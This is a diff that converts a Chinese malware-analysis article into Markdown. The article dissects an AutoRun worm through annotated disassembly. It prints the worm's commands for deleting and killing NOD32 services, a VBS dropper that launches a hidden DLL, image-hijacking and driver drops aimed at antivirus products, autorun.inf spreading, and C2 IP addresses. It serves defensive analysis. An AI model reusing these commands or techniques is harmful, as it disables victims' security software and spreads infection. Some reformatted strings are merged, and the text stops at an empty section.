@@ -1,942 +1,1369 @@
 
-
 # 蠕虫也猖狂？？？(⊙o⊙)
 
 > 原文：[`www.pediy.com/kssd/pediy11/105570.html`](https://www.pediy.com/kssd/pediy11/105570.html)
 
-【文章标题】简单分析某蠕虫病毒  
-【NOD32 命名】 Win32/AutoRun.Agent.IE  
-【相关信息】Nspack 3.7 加壳、加壳后长度 33,792 字节  
-【相关工具】PEID、OllyDBG  
-【操作平台】Windows XP SP3  
-  
-(一)、病毒执行的总体流程  
-131414E0   .  81EC 20020000 sub     esp, 220  
-131414E6   .  56            push    esi  
-131414E7   .  8B35 FC301413 mov     esi, dword ptr \[131430FC\]        ;  USER32.MessageBoxA  
-131414ED   .  57            push    edi  
-131414EE   .  6A 00         push    0                                  
-131414F0   .  68 E8D91413   push    1314D9E8                         ; |Title = "CNGXB"  
-131414F5   .  68 E0D91413   push    1314D9E0                         ; |Text = "FUCK"  
-131414FA   .  6A FF         push    -1                               ; 隐藏窗口  
-131414FC   .  FFD6          call    esi                              ; \\MessageBoxA  
-131414FE   .  6A 00         push    0                                  
-13141500   .  68 DCD91413   push    1314D9DC                         ; |Title = "TMD"  
-13141505   .  68 D0D91413   push    1314D9D0                         ; |Text = "ALASEINFKYS"  
-1314150A   .  6A FF         push    -1                               ; 隐藏窗口  
-1314150C   .  FFD6          call    esi                              ; \\MessageBoxA  
-1314150E   .  8D4424 24     lea     eax, dword ptr \[esp+24\]  
-13141512   .  68 00010000   push    100                                
-13141517   .  50            push    eax                                
-13141518   .  6A 00         push    0                                  
-1314151A   .  FF15 8C301413 call    dword ptr \[1314308C\]               
-13141520   .  8D4C24 24     lea     ecx, dword ptr \[esp+24\]  
-13141524   .  6A 06         push    6                                ; /FileAttributes = HIDDEN|SYSTEM  
-13141526   .  51            push    ecx                                
-13141527   .  FF15 9C301413 call    dword ptr \[1314309C\]             ; \\SetFileAttributesA，设置病毒自身为系统隐藏  
-1314152D   .  68 C4D91413   push    1314D9C4                         ; /FileName = "AUTORUN.INF"  
-13141532   .  FF15 88301413 call    dword ptr \[13143088\]             ；GetFileAttributesA  
-13141538   .  83F8 FF       cmp     eax, -1  
-1314153B   . /75 11         jnz     short 1314154E  
-1314153D   . |6A 04         push    4                                ; /Flags = DELAY\_UNTIL\_REBOOT  
-1314153F   . |8D5424 28     lea     edx, dword ptr \[esp+28\]            
-13141543   . |6A 00         push    0                                  
-13141545   . |52            push    edx                                
-13141546   . |FF15 50301413 call    dword ptr \[13143050\]             ; \\MoveFileExA  
-1314154C   . /EB 34         jmp     short 13141582  
-1314154E   > |B9 41000000   mov     ecx, 41  
-13141553   . |33C0          xor     eax, eax  
-13141555   . |8DBC24 240100>lea     edi, dword ptr \[esp+124\]  
-1314155C   . |6A 03         push    3                                  
-1314155E   . |F3:AB         rep     stos dword ptr es:\[edi\]            
-13141560   . |8D4424 28     lea     eax, dword ptr \[esp+28\]            
-13141564   . |8D8C24 280100>lea     ecx, dword ptr \[esp+128\]           
-1314156B   . |50            push    eax                                
-1314156C   . |51            push    ecx                                
-1314156D   . |E8 6E0F0000   call    131424E0                           
-13141572   . |8D9424 300100>lea     edx, dword ptr \[esp+130\]  
-13141579   . |52            push    edx  
-1314157A   . |E8 D1FEFFFF   call    13141450  
-1314157F   . |83C4 10       add     esp, 10  
-13141582   > \\FF15 F8301413 call    dword ptr \[131430F8\]             ; \[GetInputState  
-13141588   .  6A 00         push    0                                ; /lParam = 0  
-1314158A   .  6A 00         push    0                                ; |wParam = 0  
-1314158C   .  6A 00         push    0                                ; |Message = WM\_NULL  
-1314158E   .  FF15 4C301413 call    dword ptr \[1314304C\]             ; |\[GetCurrentThreadId  
-13141594   .  50            push    eax                              ; |ThreadId  
-13141595   .  FF15 F4301413 call    dword ptr \[131430F4\]             ; \\PostThreadMessageA  
-1314159B   .  6A 00         push    0                                ; /MsgFilterMax = 0  
-1314159D   .  6A 00         push    0                                  
-1314159F   .  8D4424 10     lea     eax, dword ptr \[esp+10\]            
-131415A3   .  6A 00         push    0                                  
-131415A5   .  50            push    eax                                
-131415A6   .  FF15 F0301413 call    dword ptr \[131430F0\]               
-131415AC   .  68 B8D91413   push    1314D9B8                         ; /MutexName = "QQ935623508"  
-131415B1   .  6A 00         push    0                                  
-131415B3   .  6A 00         push    0                                  
-131415B5   .  FF15 48301413 call    dword ptr \[13143048\]             ; \\CreateMutexA（创建互斥体）  
-131415BB   .  8BF8          mov     edi, eax  
-131415BD   .  FF15 44301413 call    dword ptr \[13143044\]             ;  ntdll.RtlGetLastWin32Error  
-131415C3   .  3D B7000000   cmp     eax, 0B7  
-131415C8   . /75 1F         jnz     short 131415E9  
-131415CA   . |57            push    edi                              ; /hObject  
-131415CB   . |FF15 40301413 call    dword ptr \[13143040\]             ; \\CloseHandle  
-131415D1   . |6A 00         push    0  
-131415D3   . |68 80D81413   push    1314D880                         ;  ASCII "212120"  
-131415D8   . |68 78D81413   push    1314D878  
-131415DD   . |6A FF         push    -1  
-131415DF   . |FFD6          call    esi  
-131415E1   . |6A 00         push    0                                ; /ExitCode = 0  
-131415E3   . |FF15 3C301413 call    dword ptr \[1314303C\]             ; \\ExitProcess  
-131415E9   > \\E8 92030000   call    13141980                         ；设置 SeDebugPrivilege，提升权限  
-131415EE   .  8B3D A4301413 mov     edi, dword ptr \[131430A4\]        ;  kernel32.Sleep  
-131415F4   .  68 D0070000   push    7D0                              ; /Timeout = 2000. ms  
-131415F9   .  FFD7          call    edi                              ; \\Sleep  
-131415FB   .  68 ACD91413   push    1314D9AC                         ;  ASCII "ekrn.exe"  
-13141600   .  E8 AB0C0000   call    131422B0                         ；遍历进程查找 ekrn.exe  
-13141605   .  8B35 A0301413 mov     esi, dword ptr \[131430A0\]        ;  kernel32.WinExec  
-1314160B   .  83C4 04       add     esp, 4  
-1314160E   .  85C0          test    eax, eax  
-13141610   .  74 1B         je      short 1314162D                   ；比较是否找到 ekrn.exe  
-13141612   .  6A 00         push    0                                ; /ShowState = SW\_HIDE  
-13141614   .  68 94D91413   push    1314D994                         ; |CmdLine = "cmd /c sc delete ekrn"  
-13141619   .  FFD6          call    esi                              ; \\WinExec(删除服务)  
-1314161B   .  6A 00         push    0                                  
-1314161D   .  68 74D91413   push    1314D974                         ; |CmdLine = "cmd /c taskkill /im ekrn.exe /f"  
-13141622   .  FFD6          call    esi                              ; \\WinExec（强制结束 ekrn.exe 进程）  
-13141624   .  6A 00         push    0                                  
-13141626   .  68 54D91413   push    1314D954                         ; |CmdLine = "cmd /c taskkill /im egui.exe /f"  
-1314162B   .  FFD6          call    esi                              ; \\WinExec（强制结束 egui.exe 进程）  
-1314162D   >  68 44D91413   push    1314D944  
-13141632   .  E8 790C0000   call    131422B0                         ；遍历进程查找 nod32krn.exe  
-13141637   .  83C4 04       add     esp, 4  
-1314163A   .  85C0          test    eax, eax  
-1314163C   . /74 1B         je      short 13141659                   ；比较失败则跳转  
-1314163E   . |6A 00         push    0  
-13141640   . |68 28D91413   push    1314D928                         ;  ASCII "cmd /c sc delete nod32krn"  
-13141645   . |FFD6          call    esi                              ; \\WinExec(删除服务)  
-13141647   . |6A 00         push    0  
-13141649   . |68 04D91413   push    1314D904                         ;  ASCII "cmd /c taskkill /im nod32krn.exe /f"  
-1314164E   . |FFD6          call    esi                              ; \\WinExec（强制结束 nod32krn.exe 进程）  
-13141650   . |6A 00         push    0  
-13141652   . |68 E0D81413   push    1314D8E0                         ;  ASCII "cmd /c taskkill /im nod32gui.exe /f"  
-13141657   . |FFD6          call    esi                              ; \\WinExec（强制结束 nod32gui.exe 进程）  
-13141659   > \\68 401F0000   push    1F40  
-1314165E   .  FFD7          call    edi                                
-13141660   .  E8 FBFAFFFF   call    13141160  
-13141665   .  68 30750000   push    7530  
-1314166A   .  FFD7          call    edi                              ；sleep 30 秒  
-1314166C   .  8B35 38301413 mov     esi, dword ptr \[13143038\]        ;  kernel32.CreateThread  
-13141672   .  6A 00         push    0                                 
-13141674   .  6A 00         push    0                                  
-13141676   .  6A 00         push    0                                  
-13141678   .  68 90101413   push    13141090                         ; |ThreadFunction = 样本.13141090  
-1314167D   .  6A 00         push    0                                  
-1314167F   .  6A 00         push    0                                  
-13141681   .  FFD6          call    esi                              ; \\CreateThread，释放释放 DLL12.TEM 的动态链接库  
-13141683   .  68 6CD81413   push    1314D86C                         ; /FileName = "C:\\sam.dll"  
-13141688   .  FF15 98301413 call    dword ptr \[13143098\]             ; \\DeleteFileA  
-1314168E   .  6A 00         push    0                                ; /pThreadId = NULL  
-13141690   .  6A 00         push    0                                ; |CreationFlags = 0  
-13141692   .  6A 00         push    0                                ; |pThreadParm = NULL  
-13141694   .  68 60131413   push    13141360                         ; |ThreadFunction = 样本.13141360  
-13141699   .  6A 00         push    0                                ; |StackSize = 0  
-1314169B   .  6A 00         push    0                                ; |pSecurity = NULL  
-1314169D   .  FFD6          call    esi                              ; \\CreateThread，感染\\linkinfo.dll 文件  
-1314169F   .  68 10270000   push    2710  
-131416A4   .  FFD7          call    edi  
-131416A6   .  6A 00         push    0  
-131416A8   .  6A 00         push    0  
-131416AA   .  6A 00         push    0  
-131416AC   .  68 50231413   push    13142350  
-131416B1   .  6A 00         push    0  
-131416B3   .  6A 00         push    0  
-131416B5   .  FFD6          call    esi                                      ；CreateThread，释放"\\Fonts\\lubb.fon"驱动文件结束 360 相关软件  
-131416B7   .  68 E02E0000   push    2EE0  
-131416BC   .  FFD7          call    edi  
-131416BE   .  6A 00         push    0  
-131416C0   .  6A 00         push    0  
-131416C2   .  6A 00         push    0  
-131416C4   .  68 70101413   push    13141070  
-131416C9   .  6A 00         push    0  
-131416CB   .  6A 00         push    0  
-131416CD   .  FFD6          call    esi                                ；CreateThread，创建 AVP 镜像劫持，释放\\fonts\\lvbasb.sys 结束 AVP  
-131416CF   .  6A 00         push    0  
-131416D1   .  6A 00         push    0  
-131416D3   .  6A 00         push    0  
-131416D5   .  68 C0141413   push    131414C0  
-131416DA   .  6A 00         push    0  
-131416DC   .  6A 00         push    0  
-131416DE   .  FFD6          call    esi       ；CreateThread,遍历磁盘释放 autorun.Inf 和复制病毒本身为 GRIL.PIF，实现病毒程序的自动运行。                                         
-131416E0   .  5F            pop     edi  
-131416E1   .  B8 01000000   mov     eax, 1  
-131416E6   .  5E            pop     esi  
-131416E7   .  81C4 20020000 add     esp, 220  
-131416ED   .  C3            retn  
-  
-  
-(二)、call    13141160 释放%SystemDriver%\\sam.Dll，并设置系统隐藏，结束大量安全软件进程  
-  
-13141160  /$  55            push    ebp  
-13141161  |.  8BEC          mov     ebp, esp  
-13141163  |.  81EC 04010000 sub     esp, 104  
-13141169  |.  53            push    ebx  
-1314116A  |.  90            nop  
-1314116B  |.  90            nop  
-1314116C  |.  90            nop  
-1314116D  |.  90            nop  
-1314116E  |.  68 6CD81413   push    1314D86C  
-13141173  |.  E8 180C0000   call    13141D90           ；释放%SystemDriver%\\sam.Dll，并设置系统隐藏，结束大量安全软件进程                                                                 
-13141178  |.  83C4 04       add     esp, 4  
-1314117B  |.  84C0          test    al, al  
-1314117D  |.  0F84 1C010000 je      1314129F  
-13141183  |.  8B1D A4301413 mov     ebx, dword ptr \[131430A4\]        ;  kernel32.Sleep  
-13141189  |.  68 58020000   push    258                              ; /Timeout = 600. ms  
-1314118E  |.  FFD3          call    ebx                              ; \\Sleep  
-13141190  |.  68 6CD81413   push    1314D86C  
-13141195  |.  E8 96FFFFFF   call    13141130  
-1314119A  |.  68 60D81413   push    1314D860                         ;  ASCII "CCenter.exe"        
-1314119F  |.  E8 0C110000   call    131422B0     ;查找 "CCenter.exe"                  
-131411A4  |.  83C4 08       add     esp, 8  
-131411A7  |.  85C0          test    eax, eax  
-131411A9  |.  0F84 D5000000 je      13141284  
-131411AF  |.  56            push    esi  
-131411B0  |.  57            push    edi  
-131411B1  |.  B9 40000000   mov     ecx, 40  
-131411B6  |.  33C0          xor     eax, eax  
-131411B8  |.  8DBD FDFEFFFF lea     edi, dword ptr \[ebp-103\]  
-131411BE  |.  C685 FCFEFFFF>mov     byte ptr \[ebp-104\], 0  
-131411C5  |.  F3:AB         rep     stos dword ptr es:\[edi\]  
-131411C7  |.  66:AB         stos    word ptr es:\[edi\]  
-131411C9  |.  AA            stos    byte ptr es:\[edi\]  
-131411CA  |.  8D85 FCFEFFFF lea     eax, dword ptr \[ebp-104\]  
-131411D0  |.  68 04010000   push    104                              ; /BufSize = 104 (260.)  
-131411D5  |.  50            push    eax                              ; |Buffer  
-131411D6  |.  FF15 94301413 call    dword ptr \[13143094\]             ; \\GetWindowsDirectoryA  
-131411DC    BF 4CD81413     mov     edi, 1314D84C                    ; ASCII "\\Fonts\\lsnsts.VBS"  
+【文章标题】简单分析某蠕虫病毒
+
+【NOD32 命名】`Win32/AutoRun.Agent.IE`
+
+【相关信息】Nspack 3.7 加壳、加壳后长度 33,792 字节
+
+【相关工具】PEID、OllyDBG
+
+【操作平台】Windows XP SP3
+
+## (一)、病毒执行的总体流程
+
+```
+131414E0   .  81EC 20020000 sub     esp, 220
+131414E6   .  56              push    esi
+131414E7   .  8B35 FC301413 mov     esi, dword ptr [131430FC]        ;  USER32.MessageBoxA
+131414ED   .  57              push    edi
+131414EE   .  6A 00           push    0
+131414F0   .  68 E8D91413     push    1314D9E8                        ; |Title = "CNGXB"
+131414F5   .  68 E0D91413     push    1314D9E0                        ; |Text = "FUCK"
+131414FA   .  6A FF          push    -1                                ; 隐藏窗口
+131414FC   .  FFD6           call    esi                               ; \MessageBoxA
+131414FE   .  6A 00          push    0
+13141500   .  68 DCD91413     push    1314D9DC                        ; |Title = "TMD"
+13141505   .  68 D0D91413     push    1314D9D0                        ; |Text = "ALASEINFKYS"
+1314150A   .  6A FF          push    -1                                ; 隐藏窗口
+1314150C   .  FFD6           call    esi                               ; \MessageBoxA
+1314150E   .  8D4424 24      lea     eax, dword ptr [esp+24]
+13141512   .  68 00010000     push    100
+13141517   .  50              push    eax
+13141518   .  6A 00          push    0
+1314151A   .  FF15 8C301413  call    dword ptr [1314308C]
+13141520   .  8D4C24 24      lea     ecx, dword ptr [esp+24]
+13141524   .  6A 06          push    6                                 ; /FileAttributes = HIDDEN|SYSTEM
+13141526   .  51              push    ecx
+13141527   .  FF15 9C301413  call    dword ptr [1314309C]              ; \SetFileAttributesA，设置病毒自身为系统隐藏
+1314152D   .  68 C4D91413     push    1314D9C4                        ; /FileName = "AUTORUN.INF"
+13141532   .  FF15 88301413  call    dword ptr [13143088]              ; GetFileAttributesA
+13141538   .  83F8 FF        cmp     eax, -1
+1314153B   . / 75 11         jnz     short 1314154E
+1314153D   . | 6A 04         push    4                                 ; /Flags = DELAY_UNTIL_REBOOT
+1314153F   . | 8D5424 28     lea     edx, dword ptr [esp+28]
+13141543   . | 6A 00         push    0
+13141545   . | 52              push    edx
+13141546   . | FF15 50301413 call    dword ptr [13143050]              ; \MoveFileExA
+1314154C   . / EB 34         jmp     short 13141582
+1314154E   . > | B9 41000000  mov     ecx, 41
+13141553   . | 33C0          xor     eax, eax
+13141555   . | 8DBC24 240100> lea     edi, dword ptr [esp+124]
+1314155C   . | 6A 03         push    3
+1314155E   . | F3:AB        rep     stos dword ptr es:[edi]
+13141560   . | 8D4424 28    lea     eax, dword ptr [esp+28]
+13141564   . | 8D8C24 280100> lea     ecx, dword ptr [esp+128]
+1314156B   . | 50              push    eax
+1314156C   . | 51              push    ecx
+1314156D   . | E8 6E0F0000    call    131424E0
+13141572   . | 8D9424 300100> lea     edx, dword ptr [esp+130]
+13141579   . | 52              push    edx
+1314157A   . | E8 D1FEFFFF    call    13141450
+1314157F   . | 83C4 10        add     esp, 10
+13141582   . > \ FF15 F8301413 call    dword ptr [131430F8]             ; [GetInputState
+13141588   .  6A 00          push    0                                 ; /lParam = 0
+1314158A   .  6A 00          push    0                                 ; |wParam = 0
+1314158C   .  6A 00          push    0                                 ; |Message = WM_NULL
+1314158E   .  FF15 4C301413  call    dword ptr [1314304C]              ; |\[GetCurrentThreadId
+13141594   .  50              push    eax                               ; |ThreadId
+13141595   .  FF15 F4301413  call    dword ptr [131430F4]              ; \PostThreadMessageA
+1314159B   .  6A 00          push    0                                 ; /MsgFilterMax = 0
+1314159D   .  6A 00          push    0
+1314159F   .  8D4424 10      lea     eax, dword ptr [esp+10]
+131415A3   .  6A 00          push    0
+131415A5   .  50              push    eax
+131415A6   .  FF15 F0301413  call    dword ptr [131430F0]
+131415AC   .  68 B8D91413     push    1314D9B8                        ; /MutexName = "QQ935623508"
+131415B1   .  6A 00          push    0
+131415B3   .  6A 00          push    0
+131415B5   .  FF15 48301413  call    dword ptr [13143048]              ; \CreateMutexA（创建互斥体）
+131415BB   .  8BF8           mov     edi, eax
+131415BD   .  FF15 44301413  call    dword ptr [13143044]              ;  ntdll.RtlGetLastWin32Error
+131415C3   .  3D B7000000    cmp     eax, 0B7
+131415C8   . / 75 1F         jnz     short 131415E9
+131415CA   . | 57              push    edi                               ; /hObject
+131415CB   . | FF15 40301413 call    dword ptr [13143040]              ; \CloseHandle
+131415D1   . | 6A 00         push    0
+131415D3   . | 68 80D81413    push    1314D880                          ;  ASCII "212120"
+131415D8   . | 68 78D81413    push    1314D878
+131415DD   . | 6A FF         push    -1
+131415DF   . | FFD6           call    esi
+131415E1   . | 6A 00         push    0                                 ; /ExitCode = 0
+131415E3   . | FF15 3C301413 call    dword ptr [1314303C]              ; \ExitProcess
+131415E9   . > \ E8 92030000  call    13141980                          ；设置 SeDebugPrivilege，提升权限
+131415EE   .  8B3D A4301413  mov     edi, dword ptr [131430A4]         ;  kernel32.Sleep
+131415F4   .  68 D0070000    push    7D0                               ; /Timeout = 2000. ms
+131415F9   .  FFD7           call    edi                               ; \Sleep
+131415FB   .  68 ACD91413     push    1314D9AC                          ;  ASCII "ekrn.exe"
+13141600   .  E8 AB0C0000    call    131422B0                          ；遍历进程查找 ekrn.exe
+13141605   .  8B35 A0301413  mov     esi, dword ptr [131430A0]         ;  kernel32.WinExec
+1314160B   .  83C4 04        add     esp, 4
+1314160E   .  85C0           test    eax, eax
+13141610   .  74 1B         je      short 1314162D                      ；比较是否找到 ekrn.exe
+13141612   .  6A 00          push    0                                 ; /ShowState = SW_HIDE
+13141614   .  68 94D91413     push    1314D994                          ; |CmdLine = "cmd /c sc delete ekrn"
+13141619   .  FFD6           call    esi                               ; \WinExec(删除服务)
+1314161B   .  6A 00          push    0
+1314161D   .  68 74D91413     push    1314D974                          ; |CmdLine = "cmd /c taskkill /im ekrn.exe /f"
+13141622   .  FFD6           call    esi                               ; \WinExec（强制结束 ekrn.exe 进程）
+13141624   .  6A 00          push    0
+13141626   .  68 54D91413     push    1314D954                          ; |CmdLine = "cmd /c taskkill /im egui.exe /f"
+1314162B   .  FFD6           call    esi                               ; \WinExec（强制结束 egui.exe 进程）
+1314162D   . > 68 44D91413    push    1314D944
+13141632   .  E8 790C0000    call    131422B0                          ；遍历进程查找 nod32krn.exe
+13141637   .  83C4 04        add     esp, 4
+1314163A   .  85C0           test    eax, eax
+```
+
+
+
+### 汇编指令序列
+
+```asm
+1314163C   . /74 1B          je      short 13141659             ；比较失败则跳转  
+1314163E   . |6A 00          push    0  
+13141640   . |68 28D91413    push    1314D928             ;  ASCII "cmd /c sc delete nod32krn"  
+13141645   . |FFD6           call    esi                ; \\WinExec(删除服务)  
+13141647   . |6A 00          push    0  
+13141649   . |68 04D91413    push    1314D904             ;  ASCII "cmd /c taskkill /im nod32krn.exe /f"  
+1314164E   . |FFD6           call    esi                ; \\WinExec（强制结束 nod32krn.exe 进程）  
+13141650   . |6A 00          push    0  
+13141652   . |68 E0D81413    push    1314D8E0             ;  ASCII "cmd /c taskkill /im nod32gui.exe /f"  
+13141657   . |FFD6           call    esi                ; \\WinExec（强制结束 nod32gui.exe 进程）  
+13141659   > \\68 401F0000   push    1F40  
+1314165E   .  FFD7           call    edi                 
+13141660   .  E8 FBFAFFFF    call    13141160  
+13141665   .  68 30750000    push    7530  
+1314166A   .  FFD7           call    edi                 ；sleep 30 秒  
+1314166C   .  8B35 38301413 mov     esi, dword ptr [13143038]        ;  kernel32.CreateThread  
+13141672   .  6A 00          push    0         
+13141674   .  6A 00          push    0         
+13141676   .  6A 00          push    0         
+13141678   .  68 90101413    push    13141090             ; |ThreadFunction = 样本.13141090  
+1314167D   .  6A 00          push    0         
+1314167F   .  6A 00          push    0         
+13141681   .  FFD6           call    esi                ; \\CreateThread，释放释放 DLL12.TEM 的动态链接库  
+13141683   .  68 6CD81413    push    1314D86C             ; /FileName = "C:\\sam.dll"  
+13141688   .  FF15 98301413 call    dword ptr [13143098]           ; \\DeleteFileA  
+1314168E   .  6A 00          push    0                   ; /pThreadId = NULL  
+13141690   .  6A 00          push    0                   ; |CreationFlags = 0  
+13141692   .  6A 00          push    0                   ; |pThreadParm = NULL  
+13141694   .  68 60131413    push    13141360             ; |ThreadFunction = 样本.13141360  
+13141699   .  6A 00          push    0                   ; |StackSize = 0  
+1314169B   .  6A 00          push    0                   ; |pSecurity = NULL  
+1314169D   .  FFD6           call    esi                ; \\CreateThread，感染\\linkinfo.dll 文件  
+1314169F   .  68 10270000    push    2710  
+131416A4   .  FFD7           call    edi  
+131416A6   .  6A 00          push    0  
+131416A8   .  6A 00          push    0  
+131416AA   .  6A 00          push    0  
+131416AC   .  68 50231413    push    13142350  
+131416B1   .  6A 00          push    0  
+131416B3   .  6A 00          push    0  
+131416B5   .  FFD6           call    esi                ；CreateThread，释放"\\Fonts\\lubb.fon"驱动文件结束 360 相关软件  
+131416B7   .  68 E02E0000    push    2EE0  
+131416BC   .  FFD7           call    edi  
+131416BE   .  6A 00          push    0  
+131416C0   .  6A 00          push    0  
+131416C2   .  6A 00          push    0  
+131416C4   .  68 70101413    push    13141070  
+131416C9   .  6A 00          push    0  
+131416CB   .  6A 00          push    0  
+131416CD   .  FFD6           call    esi                ；CreateThread，创建 AVP 镜像劫持，释放\\fonts\\lvbasb.sys 结束 AVP  
+131416CF   .  6A 00          push    0  
+131416D1   .  6A 00          push    0  
+131416D3   .  6A 00          push    0  
+131416D5   .  68 C0141413    push    131414C0  
+131416DA   .  6A 00          push    0  
+131416DC   .  6A 00          push    0  
+131416DE   .  FFD6           call    esi       ；CreateThread,遍历磁盘释放 autorun.Inf 和复制病毒本身为 GRIL.PIF，实现病毒程序的自动运行。                
+131416E0   .  5F             pop     edi  
+131416E1   .  B8 01000000    mov     eax, 1  
+131416E6   .  5E             pop     esi  
+131416E7   .  81C4 20020000 add     esp, 220  
+131416ED   .  C3             retn  
+```
+
+### (二)、call `13141160` 释放 `%SystemDriver%\\sam.Dll`，并设置系统隐藏，结束大量安全软件进程
+
+```asm
+13141160  /$  55            push    ebp  
+13141161  |.  8BEC          mov     ebp, esp  
+13141163  |.  81EC 04010000 sub     esp, 104  
+13141169  |.  53            push    ebx  
+1314116A  |.  90            nop  
+1314116B  |.  90            nop  
+1314116C  |.  90            nop  
+1314116D  |.  90            nop  
+1314116E  |.  68 6CD81413   push    1314D86C  
+13141173  |.  E8 180C0000   call    13141D90        ；释放%SystemDriver%\\sam.Dll，并设置系统隐藏，结束大量安全软件进程                
+13141178  |.  83C4 04       add     esp, 4  
+1314117B  |.  84C0          test    al, al  
+1314117D  |.  0F84 1C010000 je      1314129F  
+13141183  |.  8B1D A4301413 mov     ebx, dword ptr [131430A4]        ;  kernel32.Sleep  
+13141189  |.  68 58020000   push    258                  ; /Timeout = 600. ms  
+1314118E  |.  FFD3          call    ebx                  ; \\Sleep  
+13141190  |.  68 6CD81413   push    1314D86C  
+13141195  |.  E8 96FFFFFF   call    13141130  
+1314119A  |.  68 60D81413    push    1314D860             ;  ASCII "CCenter.exe"      
+1314119F  |.  E8 0C110000   call    131422B0     ;查找 "CCenter.exe"          
+131411A4  |.  83C4 08       add     esp, 8  
+131411A7  |.  85C0          test    eax, eax  
+131411A9  |.  0F84 D5000000 je      13141284  
+131411AF  |.  56            push    esi  
+131411B0  |.  57            push    edi  
+131411B1  |.  B9 40000000   mov     ecx, 40  
+131411B6  |.  33C0          xor     eax, eax  
+131411B8  |.  8DBD FDFEFFFF lea     edi, dword ptr [ebp-103]  
+131411BE  |.  C685 FCFEFFFF>mov     byte ptr [ebp-104], 0  
+131411C5  |.  F3:AB         rep     stos dword ptr es:[edi]  
+131411C7  |.  66:AB         stos    word ptr es:[edi]  
+131411C9  |.  AA            stos    byte ptr es:[edi]  
+131411CA  |.  8D85 FCFEFFFF lea     eax, dword ptr [ebp-104]  
+131411D0  |.  68 04010000   push    104                  ; /BufSize = 104 (260.)  
+131411D5  |.  50            push    eax                  ; |Buffer  
+131411D6  |.  FF15 94301413 call    dword ptr [13143094]           ; \\GetWindowsDirectoryA  
+131411DC    BF 4CD81413     mov     edi, 1314D84C             ; ASCII "\\Fonts\\lsnsts.VBS"  
+```
+
+**`lsnsts.VBS` 的内容**
+
+```vbscript
+Set wshshell=wscript.CreateObject("WScript.Shell")  
+wshshell.run "rundll32 C:\\sam.dll,RSDK",0 
+```
+
+```asm
+131411E1  |.  83C9 FF       or      ecx, FFFFFFFF  
+131411E4  |.  33C0          xor     eax, eax  
+131411E6  |.  8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+131411EC  |.  F2:AE         repne   scas byte ptr es:[edi]  
+131411EE  |.  F7D1          not     ecx  
+131411F0  |.  2BF9          sub     edi, ecx  
+131411F2  |.  68 A4D71413   push    1314D7A4             ; /mode = "w+"  
+131411F7  |.  8BF7          mov     esi, edi             ; |  
+131411F9  |.  8BFA          mov     edi, edx             ; |  
+131411FB  |.  8BD1          mov     edx, ecx             ; |  
+131411FD  |.  83C9 FF       or      ecx, FFFFFFFF        ; |  
+13141200  |.  F2:AE         repne   scas byte ptr es:[edi]         ; |  
+13141202  |.  8BCA          mov     ecx, edx             ; |  
+13141204  |.  4F            dec     edi                  ; |  
+13141205  |.  C1E9 02       shr     ecx, 2               ; |  
+13141208  |.  F3:A5         rep     movs dword ptr es:[edi], dword p>; |  
+1314120A  |.  8BCA          mov     ecx, edx             ; |  
+```
+
+
+
+### 1. 释放 DLL12.TEM 的动态链接库
+
+```
+1314120C   |.   8D85 FCFEFFFF lea     eax, dword ptr [ebp-104]         ; |  
+
+13141212   |.   83E1 03       and     ecx, 3                           ; |  
+
+13141215   |.   50          push    eax                            ; |path  
+
+13141216   |.   F3:A4       rep     movs byte ptr es:[edi], byte ptr>; |  
+
+13141218   |.   E8 B1120000 call    131424CE                       ; \\fopen  
+
+1314121D   |.   8BF0        mov     esi, eax  
+
+1314121F   |.   83C4 08     add     esp, 8  
+
+13141222   |.   85F6        test    esi, esi  
+
+13141224   |.   74 1F       je      short 13141245  
+
+13141226   |.   56          push    esi                            ; /stream  
+
+13141227   |.   68 18D81413 push    1314D818                 ; |s = "Setwshshell=wscript.CreateObject(""WScript.Shell"")",LF,""  
+
+1314122C   |.   E8 A3120000 call    131424D4                       ; \\fputs  
+
+13141231   |.   56          push    esi                            ; /stream  
+
+13141232   |.   68 ECD71413 push    1314D7EC                 ; |s = "wshshell.run ""rundll32 C:\sam.dll,RSDK"",0"  
+
+13141237   |.   E8 98120000 call    131424D4                       ; \\fputs  
+
+1314123C   |.   56          push    esi                            ; /stream  
+
+1314123D   |.   E8 80120000 call    131424C2                       ; \\fclose  
+
+13141242   |.   83C4 14     add     esp, 14  
+
+13141245   |>   68 B0040000 push    4B0  
+
+1314124A   |.   FFD3        call    ebx  
+
+1314124C   |.   6A 00       push    0                              ; /IsShown = 0  
+
+1314124E   |.   8D8D FCFEFFFF lea     ecx, dword ptr [ebp-104]         ; |  
+
+13141254   |.   6A 00       push    0                              ; |DefDir = NULL  
+
+13141256   |.   51          push    ecx                            ; |Parameters  
+
+13141257   |.   68 E0D71413 push    1314D7E0                         ; |FileName = "cscript.exe"  
+
+1314125C   |.   68 D8D71413 push    1314D7D8                         ; |Operation = "open"  
+
+13141261   |.   6A 00       push    0                              ; |hWnd = NULL  
+
+13141263   |.   FF15 E8301413 call    dword ptr [131430E8]               ; \\ShellExecuteA  
+
+13141269   |.   68 88130000 push    1388  
+
+1314126E   |.   FFD3        call    ebx  
+
+13141270   |.   8D95 FCFEFFFF lea     edx, dword ptr [ebp-104]  
+
+13141276   |.   52          push    edx                            ; /FileName  
+
+13141277   |.   FF15 98301413 call    dword ptr [13143098]               ; \\DeleteFileA  
+
+1314127D   |.   5F          pop     edi  
+
+1314127E   |.   5E          pop     esi  
+
+1314127F   |.   5B          pop     ebx  
+
+13141280   |.   8BE5        mov     esp, ebp  
+
+13141282   |.   5D          pop     ebp  
+
+13141283   |.   C3          retn  
+
+13141284     6A 00          push    0  
+
+13141286     6A 00          push    0  
+
+13141288     68 C8D71413    push    1314D7C8                         ; ASCII "C:\sam.dll,RSDK"  
+
+1314128D     68 B8D71413    push    1314D7B8                         ; ASCII "rundll32.exe"  
+
+13141292     68 D8D71413    push    1314D7D8                         ; ASCII "open"  
+
+13141297     6A 00          push    0  
+
+13141299     FF15 E8301413  call    dword ptr [131430E8]               ; SHELL32.ShellExecuteA  
+
+1314129F     5B            pop     ebx  
+
+131412A0     8BE5        mov     esp, ebp  
+
+131412A2     5D            pop     ebp  
+
+131412A3     C3            retn  
+```
+
+释放 `DLL12.TEM` 的动态链接库，在动态库中释放 `isb.Ini` 地址列表，创建了大量的安全软件的镜像劫持
+
+### 2. 样本信息
+
+`ver2`
+
+#### C2 服务器 IP
+
+- `61.135.189.52`
+- `220.181.19.70`
+- `118.228.148.28`
+- `221.236.12.230`
+- `121.14.0.58`
+- `211.65.195.65`
+- `219.234.81.61`
+- `203.184.141.226`
+- `222.35.250.144`
+
+#### 域名
+
+- `echo.acc.sogou.Com`
+
+### 3. 行为分析
